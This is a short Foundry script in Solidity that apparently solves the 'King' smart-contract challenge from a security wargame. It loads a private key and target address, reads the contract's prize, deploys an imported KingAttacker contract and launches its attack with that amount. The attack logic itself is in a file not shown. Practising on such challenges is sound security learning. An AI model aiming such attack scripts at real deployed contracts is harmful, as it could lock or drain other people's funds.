// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/KingAttacker.sol";

contract KingAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address kingAddress = vm.envAddress("KING_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        King king = King(payable(kingAddress));
        uint256 prize = king.prize();
        KingAttacker attacker = new KingAttacker();
        attacker.attack{value: prize}(kingAddress);
        vm.stopBroadcast();
    }
}
